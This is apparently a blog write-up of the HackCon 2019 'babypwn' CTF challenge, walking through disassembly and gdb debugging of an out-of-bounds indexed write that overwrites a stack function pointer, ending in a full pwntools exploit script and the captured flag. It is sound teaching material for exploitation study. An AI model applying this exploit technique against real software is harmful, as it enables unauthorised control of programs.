---
layout: post
title:  "HackCon 2019: babypwn"
date:   2019-08-26 14:00:00 +0800
categories: writeups hackcon
---

Disclaimer: I didn't solve this challenge during the ctf. After it was over, r4j from JHDiscord released this [writeup](https://github.com/r4j1337/ctf-writeups/blob/master/hackcon2019/pwn/babypwn/exploit.py), but didn't provide any explanation as to how he found the solution, which I feel is important in this case since this is (in my opinion) more of an RE challenge than a pwn challenge, but I digress.

### Challenge

* **Category:** pwn
* **Points:** 451
* **Solves:** 36

> You don't need eip control for every pwn. Service : `nc 68.183.158.95 8990`

The challenge provided the following files:
```
babypwn
```

### Solution

As mentioned in the disclaimer, this challenge is more of an RE challenge although it is classified as a pwn challenge. As usual, let's start with a checksec.
```sh
vagrant@ubuntu-bionic:/ctf/pwns/hackcon2019/pwn/babypwn$ checksec babypwn
[*] '/ctf/pwns/hackcon2019/pwn/babypwn/babypwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

So we see a canary, which basically tells us that we will need a way to leak the stack canary somehow if we were to try to do any buffer overflow attacks. Of course, the challenge description tells us we won't need eip control, so let's try to run the binary and see what happens.
```sh
vagrant@ubuntu-bionic:/ctf/pwns/hackcon2019/pwn/babypwn$ ./babypwn
asd
qwe
a
zx
c
asd

qwe

a

zx

c

Naaa  , Try HArder
```

So it takes our input 5 times, then prints it back to us, before printing 'Naaa  , Try HArder'. First instinct then is to obviously check for a format string vulnerability.
```sh
vagrant@ubuntu-bionic:/ctf/pwns/hackcon2019/pwn/babypwn$ ./babypwn
asd
%x
%x
%x
%x
asd

%x

%x

%x

%x

Naaa  , Try HArder
```

Nope, seems like it sanitizes our input. Alright, let's get to reverse engineering the binary. I use radare2 with the cutter GUI. The main function basically starts by setting an alarm and then setting some properties for stdin, stdout, and stderr. I will skip that part, and go to the important bits.

```
0x0040093c      lea  rax, [sym.nope] ; 0x400817
0x00400943      mov  qword [var_40h], rax
0x00400947      mov  qword [s], 0
....
....
0x004009fe      mov  rax, qword [var_40h]
0x00400a02      call rax
0x00400a04      nop
0x00400a05      mov  rax, qword [canary]
0x00400a09      xor  rax, qword fs:[0x28]
```

Okay, so to begin with, at instruction `0x00400943` the address of the `nope()` function gets loaded into `var_40h` which is located at `rbp-0x40`. We then see a `mov rax, qword [var_40h]` followed by a `call rax` at `0x004009fe`. If we look at the disassembly for the `nope()` function, we will see that it outputs the string 'Naaa  , Try HArder', so we have to somehow be able to control this value at `rbp-0x40` and change it to something, because we know this `call rax` is what prints that string after taking our input 5 times. What do we change it to? Well, the binary also has a convenient `win()` function which outputs the flag. Simple as that, but how do we control this value at `rbp-0x40`?

Below is the section right after the binary has initialized all variables. We see that the `fgets()` call will read 0x11 bytes into the `var_50h` buffer (located at `rbp-0x50`, easily figured out by looking at the top of the disassembly for `main`, or with gdb).
```
0x00400983      lea  rax, [var_50h]
0x00400987      mov  esi, 0x11 ; 17 ; int size
0x0040098c      mov  rdi, rax ; char *s
0x0040098f      call sym.imp.fgets ; char *fgets(char *s, int size, FILE *stream)
0x00400994      mov  edx, dword [var_44h]
0x00400997      lea  rax, [var_30h]
0x0040099b      movsxd rdx, edx
0x0040099e      shl  rdx, 3
0x004009a2      lea  rcx, [rax + rdx]
0x004009a6      lea  rax, [var_50h]
0x004009aa      mov  edx, 8 ; size_t  n
0x004009af      mov  rsi, rax ; const char *src
0x004009b2      mov  rdi, rcx ; char *dest
0x004009b5      call sym.imp.strncpy ; char *strncpy(char *dest, const char *src, size_t  n)
```

So let's break it down shall we. Remember that our input is going to be `0x11` bytes big, stored at `rbp-0x50`, and the last byte will be set as `\0` by `fgets` (which isn't that important, but just pointing it out now).

1. `mov edx, dword [var_44h]` will move four bytes from `rbp-0x44` to `edx`. Our input starts at `rbp-0x50`, so calculating the offset, we get `(rbp-0x50) - (rbp-0x44) = 0x50 - 0x44 = 12`, therefore we know that it will take the 4 bytes right after the initial 12 bytes of our input, and move it into edx (which is basically the last four bytes of our input not counting the byte that gets converted to `\0`). To elaborate, if we typed in `ABCDEFGHIJKLMNOP\n`, it would move `MNOP` (which is just `\x4d\x4e\x4f\x50`, so `edx` will contain `0x504f4e4d` because of little endianness) into `edx`.

2. Following that, it loads the effective address of `var_30h` (located at `rbp-0x30`) into `rax`.

3. It will then do `movsxd rdx, edx`, which will (in this case) move the value from `edx` (a 32 bit register) to `rdx` (a 64 bit register), literally moving it in place in the same register, except that it will `sign-extend` the value from 32 bit to 64 bit. As an example: Given a value of `0xffffffff` in `edx`, it would be sign extended to the 64 bit version `0xffffffffffffffff` and stored in `rdx`. The value in `edx` in this case is the last 4 bytes of our input.

4. Then, `shl rdx, 3` will left shift the sign extended version of our input by 3.

5. Then, `lea rcx, [rax + rdx]` loads whatever is stored in the address `rax + rdx` into `rcx`. Since we control `rdx`, in a way, we also control what gets moved into `rcx` here, which is important.

6. Then, `lea rax, [var_50h]` (again, same as `lea rax, rbp-0x50`) simply loads the address of our input into `rax`.

7. Then, `strncpy((rax+rdx), rbp-0x50, 8)` is called, moving the first 8 bytes of our input into the address given by `rax+rdx`

So basically, what we want to do is have `rax+rdx` equal `rbp-0x40`, so we can overwrite the address of `nope()` to the address of `win()` to get the flag. 

So, we know that we can control `rdx`, but in order to figure out what we want `rax+rdx` to be, we need to open up gdb and set a breakpoint to just before `lea rcx, [rax + rdx]` and see what the values of the registers are.
```sh
vagrant@ubuntu-bionic:/ctf/pwns/hackcon2019/pwn/babypwn$ gdb ./babypwn
gef➤  b *0x004009a2
Breakpoint 1 at 0x4009a2

gef➤  run
Starting program: /ctf/pwns/hackcon2019/pwn/babypwn/babypwn
AAAAAAAABBBBBBBB

[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffdae0  →  0x0000000000000000
$rbx   : 0x0
$rcx   : 0x00007ffff7af4081  →  0x5777fffff0003d48 ("H="?)
$rdx   : 0x212121210
$rsp   : 0x00007fffffffdac0  →  "AAAAAAAABBBBBBBB"
$rbp   : 0x00007fffffffdb10  →  0x0000000000400a20  →  <__libc_csu_init+0> push r15

<-- TRUNCATED -->

gef➤  p ($rbp-0x40) - $rax
$3 = (void *) 0xfffffffffffffff0
```

Okay so since we want `rax+rdx == rbp-0x40`, we simply do `rbp-0x40 - rax` to find out what value we want rdx to be. In this case, we are told that we want `rdx` to finally end up with the value `0xfffffffffffffff0` (after the `shl` and `movsxd` instructions).

`0xfffffffffffffff0` is just `0xfffffffffffffffe` left shifted by 3. We know this because the last byte `0xfe` is `1111 1110` in binary, and when left shifted by 3, gives us `1111 0000` in binary, which is `0xf0` in hex.

`0xfffffffffffffffe` is just the sign extended version of `0xfffffffe`, and therefore, what we want is for the last 4 bytes of our input to be `0xfffffffe`. Since the four bytes before it won't matter, so we can just pass in `0xfffffffe00000000`. Realistically? The 0's can be anything as they don't affect anything. 

So, now the plan is to make the first 8 bytes of our input the address of the `win()` function. The second 8 bytes will be `0xfffffffe00000000` (interpreted as `\x00\x00\x00\x00\xfe\xff\xff\xff` due to little endianness). The program is gonna do the calculations for us, and call `strncpy(rbp-0x40, rbp-0x50, 8)` which will copy the address of the `win()` function and replace the address of the `nope()` function with it. 

The exploit is shown below. We also account for the fact that the program wants our input 5 times in a row before continuing:
```python
#!/usr/bin/env python2

from pwn import *

HOST, PORT = '68.183.158.95', 8990
BINARY = './babypwn'

elf = ELF(BINARY)

def start():
    if not args.REMOTE:
        return process(BINARY)
    else:
        return remote(HOST, PORT)

def debug(breakpoints):
	gdbscript = ''

	for bp in breakpoints:
		gdbscript += 'b *0x{:x}\n'.format(bp)
	gdb.attach(p, gdbscript=gdbscript)

context.terminal = ['tmux', 'new-window']
context.arch = 'amd64'

p = start()
if not args.REMOTE and args.GDB:
	debug([0x00400994])

win = elf.symbols['win']
log.info('win: ' + hex(win))

payload = p64(win) # The first 8 bytes of our input
payload += p64(0xfffffffe00000000) # The second 8 bytes of our input
payload += '\n'*6 # Send no input for the remaining times, so we don't affect anything

p.send(payload)

p.interactive()

``` 

Running the exploit:
```sh
vagrant@ubuntu-bionic:/ctf/pwns/hackcon2019/pwn/babypwn$ ./exploit.py REMOTE
[*] '/ctf/pwns/hackcon2019/pwn/babypwn/babypwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 68.183.158.95 on port 8990: Done
[*] win: 0x400831
[*] Switching to interactive mode










Yay , Here's the flag
d4rk{B0fs_4r3_3zzzz}c0de
[*] Got EOF while reading in interactive
$
```

Flag: `d4rk{B0fs_4r3_3zzzz}c0de`

Overall it was a good challenge, but I think it was more RE than pwn, so it should have been classified as such, but oh well.